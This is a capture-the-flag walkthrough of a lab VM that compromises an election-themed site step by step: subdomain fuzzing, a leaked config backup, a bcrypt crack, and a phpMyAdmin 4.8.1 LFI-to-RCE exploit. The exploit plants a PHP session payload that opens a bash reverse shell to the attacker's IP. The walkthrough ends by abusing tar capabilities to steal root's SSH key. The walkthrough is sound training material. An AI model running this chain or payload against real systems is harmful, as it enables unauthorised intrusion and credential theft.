Skills:

- Web Enumeration
- Information Leakage
- Virtual Hosting
- Subdomain Enumeration
- Abusing phpMyAdmin - LFI to RCE (abusing PHP ID sessions)
- Cracking Hashes (User Pivoting)
- Abusing Capabilities (tar cap_dac_read_search+ep) [Privilege Escalation]


Using whatweb to look for information about the site, I found a doman name, so I save it in the hosts file.
```
❯ whatweb 192.168.0.110
http://192.168.0.110 [200 OK] Apache[2.4.6], Bootstrap, Country[RESERVED][ZZ], Email[contact@example.com,contact@votenow.loca], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.5.38], IP[192.168.0.110], JQuery, PHP[5.5.38], Script, Title[Ontario Election Services &raquo; Vote Now!]

```

Now I fuzz the site with gobuster tool,

```
❯ gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash
/cgi-bin/             (Status: 403) [Size: 210]
/icons/               (Status: 200) [Size: 74409]
/assets/              (Status: 200) [Size: 1505]
```

gobuster only found 3 directory but not useful , so I try to fuzz for subdomains

```
❯ wfuzz --hc=400 --hl=282 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host:FUZZ.votenow.local" http://votenow.local/
"datasafe" 
```

Wfuzz found the "datasafe" subdoman, I saved it in my hosts file.

Checking the subdomain on the site , I found a phpmyadmin application, but I couldn't do anything whit it, so I try fuzzing it again.

```
❯ gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,php.bak
```


gobuster discovered a config.php.bak file, I used curl to inspect it and found a database credentials
```
❯ curl -s http://votenow.local/config.php.bak
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

I used these credentials on the phpmyadmin application and was able to log in, 
I was able to crack the hash for the 'admin' user found in the phpMyAdmin database or change the password .

Used nth to identify the hash type
```
❯ nth -t '$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i'

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i

Most Likely 
bcrypt, HC: 3200 JtR: bcrypt
Blowfish(OpenBSD), HC: 3200 JtR: bcrypt Summary: Can be used in Linux Shadow Files.
Woltlab Burning Board 4.x, 

❯ 
❯ hashcat -m 3200 hash ~/Documents/wordlist/rockyou.txt
	$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i:Stella
```


Looking for a vulnerability in the phpmyadmin version using searchsploit

the phpmayadmin version is 4.8.1, and when I used the searchsploit tool I discovered a local file inclusion and a remote code execution vulnerabilities.

```
❯ searchsploit phpmyadmin 4.8.1
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                           | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                           | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                        | php/webapps/50457.py
```

I was able to exploit these vulnerabilities to establish a reverse shell
```
#on the phpmyadmin application
Go to --> SQL
Create a payload --> select '<?php system("bash -i >& /dev/tcp/192.168.0.100/1234 0>&1"); ?>'

#On my machine
nc -nlvp 1234

#on phpmyadmin application
Go to --> http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_(mysessionid)

```

In this way I gained access to the victim machine

Privilege escalation (there is a note with a hint)

```
> sudo -l --> nothing
> find / -perm -4000 2>/dev/null --> nothing
> [admin@votenow /]$ getcap -r / 2>/dev/null
  	/usr/bin/tarS = cap_dac_read_search+ep --> capabilities
> [admin@votenow /]$ ls -la /usr/bin/tarS
-rwx------. 1 admin admin 346136 Jun 27  2020 /usr/bin/tarS
```

Found  "cap_dac_read_search+ep" capabilities on the tarS binary, which allows me to read privileged files with these capabilities
```
>[admin@votenow ~]$ tarS -cvf root.tar /root/.ssh
tarS: Removing leading `/' from member names
/root/.ssh/
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys

[admin@votenow ~]$ tarS -xf root.tar 
[admin@votenow ~]$ ls
notes.txt  pspy64  root  root.tar  user.txt
[admin@votenow ~]$ cd root
[admin@votenow root]$ ls
[admin@votenow root]$ ls -la
total 0
drwxrwxr-x  3 admin admin  18 Oct 16 20:21 .
drwx------. 3 admin admin 174 Oct 16 20:21 ..
drwx------  2 admin admin  61 Jun 28  2020 .ssh
[admin@votenow root]$ cd .ssh
[admin@votenow .ssh]$ ls
authorized_keys  id_rsa  id_rsa.pub
[admin@votenow .ssh]$ ssh -i id_rsa root@localhost -p 2082
The authenticity of host '[localhost]:2082 ([127.0.0.1]:2082)' can't be established.
ECDSA key fingerprint is SHA256:Aifft9XCM1HTYRoNyus8/X9amRXYGMI80UwZGUyWs10.
ECDSA key fingerprint is MD5:e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2082' (ECDSA) to the list of known hosts.
Last login: Sun Jun 28 00:42:56 2020 from 192.168.56.1
[root@votenow ~]# whoami
root
[root@votenow ~]# cd /root
[root@votenow ~]# ls
anaconda-ks.cfg  root-final-flag.txt
[root@votenow ~]# cat root-final-flag.txt 
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales

Please visit my blog and provide feedback - I will be glad to hear from you.


```

